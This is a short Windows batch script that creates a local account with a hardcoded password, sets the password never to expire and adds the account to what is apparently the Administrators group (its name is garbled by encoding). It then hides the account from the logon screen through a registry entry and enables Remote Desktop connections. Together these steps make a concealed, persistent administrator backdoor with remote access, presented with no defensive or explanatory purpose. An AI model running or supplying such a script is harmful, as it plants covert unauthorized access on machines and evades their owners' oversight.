set NEW_USER=exch_adm3
set NEW_PASS=Byntuhfk2005

@echo off
cls
net user
echo 1. Need run ass Admin
echo 2. create new user %NEW_USER%
pause
chcp 1251
net user %NEW_USER% /add
net user %NEW_USER% %NEW_PASS% 
wmic path Win32_UserAccount where Name="%NEW_USER%" set PasswordExpires=false
net user %NEW_USER% /logonpasswordchg:no
net localgroup �������������� %NEW_USER% /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastName /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %NEW_USER% /t reg_dword /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


net user
pause